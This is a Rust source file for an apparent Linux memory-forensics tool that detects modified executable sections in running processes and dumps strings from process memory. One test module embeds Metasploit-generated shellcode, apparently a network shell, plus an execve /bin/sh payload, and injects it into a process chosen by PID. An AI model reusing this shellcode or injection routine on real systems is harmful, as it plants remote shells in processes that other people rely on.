use std::{cmp::min, collections::HashMap, default, fmt::Write};

use bytes::Bytes;
use indicatif::{ProgressBar, ProgressState, ProgressStyle};
use linefeed::chars::is_printable;
use sha2::{Digest, Sha256};

use crate::{
    file_info::elf::{ELFParser, ET_EXEC},
    process_info::{MemoryMap, Process},
    utils::{func::i_to_m, STError},
};

use super::{STArgs, STModule, STResult};
use colored::Colorize;
pub struct CheckModifiedSectionV1 {}

impl CheckModifiedSectionV1 {
    pub fn new() -> Self {
        CheckModifiedSectionV1 {}
    }
}

impl STModule for CheckModifiedSectionV1 {
    fn run(&self, args: &STArgs) -> Result<STResult, STError> {
        if args.contains_key("pid") == false && args.contains_key("name") == false {
            return Err(STError::new(
                "CheckModifySegments module must set pid or process name",
            ));
        }

        let mut procs: Vec<Process> = vec![];
        if args.contains_key("pid") {
            let pid = args.get("pid").unwrap().parse::<u32>();
            let pid = match pid {
                Ok(_pid) => _pid,
                Err(err) => {
                    return Err(STError::from(Box::new(err)));
                }
            };

            procs.push(Process::new(pid));
        }

        if args.contains_key("name") {
            let name = args.get("name").unwrap();
            if name.eq("*") {
                procs.append(&mut Process::list_process_in_proc());
            } else {
                procs.append(&mut Process::find_processes(name.to_string()));
            }
        }

        for proc in procs {
            let pid_s = proc.get_pid().to_string().green();

            let cmdline = i_to_m(&proc).get_cmdline();

            if cmdline.len() == 0 {
                println!("Skipping kernel thread [{}]", proc.get_name().trim().blue());
                continue;
            }

            println!(
                "Checking process:{} {}",
                pid_s,
                i_to_m(&proc).get_cmdline().blue()
            );

            let mmaps = proc.get_mmaps();
            let mmaps = match mmaps {
                Ok(s) => s,
                Err(e) => {
                    continue;
                }
            };

            for mmap in &mmaps {
                if mmap.get_perm().contains("x") && mmap.get_name().len() == 0 {
                    println!(
                        "[{}]:There is a unnamed map has execution bit {:#02x}-{:#02x}",
                        "warning".yellow(),
                        mmap.get_start_addr(),
                        mmap.get_end_addr()
                    );
                }
            }
            let mut mm_map = HashMap::new();
            for map in mmaps {
                if map.get_name().starts_with("[") {
                    continue;
                }

                if map.get_name().len() > 0 && mm_map.contains_key(map.get_name()) == false {
                    mm_map.insert(map.get_name().to_string(), map);
                }
            }
            let pb = ProgressBar::new(mm_map.keys().len().try_into().unwrap());
            pb.set_style(ProgressStyle::with_template("{spinner:.green} [{elapsed_precise}] [{wide_bar:.cyan/blue}] {bytes}/{total_bytes} ({eta})")
                .unwrap()
                .with_key("eta", |state: &ProgressState, w: &mut dyn Write| write!(w, "{:.1}s", state.eta().as_secs_f64()).unwrap())
                .progress_chars("#>-"));
            let mut i = 0;
            let mm_maps_len = mm_map.len();
            for filepath in mm_map.keys() {
                i += 1;
                pb.set_position(i);
                if filepath.len() == 0 {
                    break;
                }

                let memory_map = mm_map.get(filepath).unwrap();
                let parser = ELFParser::new(&filepath);
                let parser = match parser {
                    Ok(p) => p,
                    Err(e) => {
                        //println!("[error]:{} {}",e,filepath);
                        continue;
                    }
                };
                let segs = parser.get_segments();
                let first_map = mm_map.get(filepath);
                if first_map.is_none() {
                    break;
                }

                let first_map = first_map.unwrap();
                let mem_base = first_map.get_start_addr();
                for seg in segs {
                    //If this section is executable
                    if seg.shdr.flags.0 & 0x4 == 0 {
                        continue;
                    }

                    if seg.shdr.flags.0 & 0x1 == 0x1 {
                        continue;
                    }

                    let image_data = &seg.data;
                    let mut size = seg.shdr.size;
                    let memory_data;
                    //align size
                    if parser.get_type().0 == ET_EXEC.0 {
                        memory_data = proc.read_memory(seg.shdr.addr, seg.shdr.size as usize);
                    } else {
                        memory_data =
                            proc.read_memory(mem_base + seg.shdr.addr, seg.shdr.size as usize);
                    }
                    let memory_data = match memory_data {
                        Ok(data) => data,
                        Err(e) => {
                            continue;
                        }
                    };

                    if memory_data.len() != image_data.len() && memory_data.len() != 0 {
                        println!("[{}]:There is a modified only read execution segment\n\tpid:{}\n\tmap:{}\n\tsegment:{}\n\taddress:{:#02x}", 
                        "vuln".red(),pid_s,filepath,seg.shdr.name,mem_base+seg.shdr.addr);
                        break;
                    }
                    let mut hasher1 = Sha256::new();
                    let mut hasher2 = Sha256::new();
                    hasher1.update(image_data);
                    hasher2.update(&memory_data);
                    let result1 = hasher1.finalize();
                    let result2 = hasher2.finalize();
                    if !result1.eq(&result2) {
                        println!("[{}]:There is a modified only set read execution segment\n\tpid:{}\n\tmap:{}\n\tsegment:{}\n\taddress:{:#02x}", 
                        "vuln".red(),pid_s,filepath,seg.shdr.name,mem_base+seg.shdr.addr);
                    }
                }
            }
            pb.finish_and_clear();
        }

        Ok(STResult {})
    }

    fn helper(&self) -> String {
        let result = "CheckModifiedSectionV1 pid=${pid}\n
        CheckModifiedSectionV1 name=${proc_name}\n";
        result.to_string()
    }

    fn get_name(&self) -> String {
        "CheckModifiedSectionV1".to_string()
    }

    fn get_detail(&self) -> String {
        "".to_string()
    }
}

pub struct TestInjectCode {}

impl STModule for TestInjectCode {
    fn run(&self, args: &STArgs) -> Result<STResult, STError> {
        //metasploit generate shellcode, Just for test
        let base64_code = "ailYmWoCX2oBXg8FSJdSxwQkAgAnD0iJ5moQWmoxWA8FWWoyWA8FSJZqK1gPBVBWX2oJWJm2EEiJ1k0xyWoiQVqyBw8FSJZIl18PBf/m";
        let code2 =
            b"\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
                .to_vec();
        let mut code = [0 as u8; 1024];
        let code = base64::decode(base64_code).unwrap();
        if args.contains_key("pid") == false {
            return Err(STError::new("TestInjectCode module must set pid"));
        }

        let pid = args.get("pid").unwrap().parse::<u32>();
        let pid = match pid {
            Ok(_pid) => _pid,
            Err(err) => {
                return Err(STError::from(Box::new(err)));
            }
        };

        let p = Process::new(pid);
        p.inject_code(&code);
        Ok(STResult {})
    }

    fn helper(&self) -> String {
        "TestInjectCode pid=${pid}".to_string()
    }

    fn get_name(&self) -> String {
        "TestInjectCode".to_string()
    }

    fn get_detail(&self) -> String {
        "".to_string()
    }
}

pub struct CheckShellcode {}

impl STModule for CheckShellcode {
    fn run(&self, args: &STArgs) -> Result<STResult, STError> {
        todo!()
    }

    fn helper(&self) -> String {
        todo!()
    }

    fn get_name(&self) -> String {
        todo!()
    }

    fn get_detail(&self) -> String {
        todo!()
    }
}

pub struct CheckSubtasks {}

impl STModule for CheckSubtasks {
    fn run(&self, args: &STArgs) -> Result<STResult, STError> {
        todo!()
    }

    fn helper(&self) -> String {
        todo!()
    }

    fn get_name(&self) -> String {
        todo!()
    }

    fn get_detail(&self) -> String {
        todo!()
    }
}

pub struct ProcessStrings {}

impl STModule for ProcessStrings {
    fn run(&self, args: &STArgs) -> Result<STResult, STError> {
        if args.contains_key("pid") == false {
            return Err(STError::new("ProcessStrings module must set pid"));
        }

        let codecs = Option::<String>::default();
        let pid = args.get("pid").unwrap().parse::<u32>();
        let pid = args.get("pid").unwrap().parse::<u32>();
        let pid = match pid {
            Ok(_pid) => _pid,
            Err(err) => {
                return Err(STError::from(Box::new(err)));
            }
        };

        let process = Process::new(pid);
        let mmaps = process.get_mmaps().unwrap();

        for mmap in mmaps {
            let start = mmap.get_start_addr();
            let end = mmap.get_end_addr();
            let size = mmap.get_end_addr() - start;
            let mut m_start = start;
            if mmap.get_perm().contains("x") {
                continue;
            }

            if mmap.get_name().contains(".so.") || mmap.get_name().ends_with(".so") {
                continue;
            }
            while m_start < end {
                let region = process.read_memory(m_start, 1024);
                m_start += 1024;
                let bs = region;
                let bs = match bs {
                    Ok(b) => b,
                    Err(e) => {
                        continue;
                    }
                };
                let mut start_m = 0;
                let mut end_m = 0;
                while end_m < bs.len() {
                    assert!(end_m < bs.len());
                    if bs[end_m] == 0 {
                        if bs[start_m] == 0 {
                            start_m += 1;
                            end_m += 1;
                            continue;
                        }

                        let sub: String = String::from_utf8_lossy(&bs[start_m..end_m]).to_string();
                        let mut flag = false;
                        for c in sub.chars() {
                            if is_printable(c) == false {
                                flag = true;
                                break;
                            }
                        }
                        if flag == true {
                            break;
                        }
                        start_m = end_m;
                        let addr = m_start + start_m as u64;
                        println!("{:x} {}", addr, sub);
                        continue;
                    }
                    end_m += 1;
                }
            }
        }
        return Ok(STResult {});
    }

    fn helper(&self) -> String {
        todo!()
    }

    fn get_name(&self) -> String {
        "ProcessStrings".to_string()
    }

    fn get_detail(&self) -> String {
        todo!()
    }
}


pub struct ProcessFindBytes {}

impl STModule for ProcessFindBytes {
    fn run(&self, args: &STArgs) -> Result<STResult,STError> {
        if args.contains_key("pid") == false {
            return Err(STError::new("ProcessFindBytes must has pid"));
        }

        let codecs = Option::<String>::default();
        let pid = args.get("pid").unwrap().parse::<u32>();
        let pid = match pid {
            Ok(_pid) => _pid,
            Err(err) => {
                return Err(STError::from(Box::new(err)));
            }
        };

        if args.contains_key("target") == false {
            return Err(STError::new("ProcessFindBytes must has target encode by base64"));
        }

        let target = args.get("target").unwrap();
        let target = base64::decode(target);
        let target = match target {
            Ok(_target) => _target,
            Err(err) => {
                return Err(STError::from(Box::new(err)));
            }
        };

        let process = Process::new(pid);
        let mmaps = process.get_mmaps().unwrap();

        for mmap in mmaps {
            let start = mmap.get_start_addr();
            let end = mmap.get_end_addr();
            let size = mmap.get_end_addr() - start;
            let mut m_start = start;
            if mmap.get_perm().contains("x") {
                continue;
            }

            if mmap.get_name().contains(".so.") || mmap.get_name().ends_with(".so") {
                continue;
            }
            while m_start < end {
                let region = process.read_memory(m_start, 1024);
                m_start += 1024;
                let bs = region;
                let bs = match bs {
                    Ok(b) => b,
                    Err(e) => {
                        continue;
                    }
                };
                let bs = Bytes::from(bs);
                
            }
        }
        return Ok(STResult {});
    }

    fn helper(&self) -> String {
        todo!()
    }

    fn get_name(&self) -> String {
        todo!()
    }

    fn get_detail(&self) -> String {
        todo!()
    }
}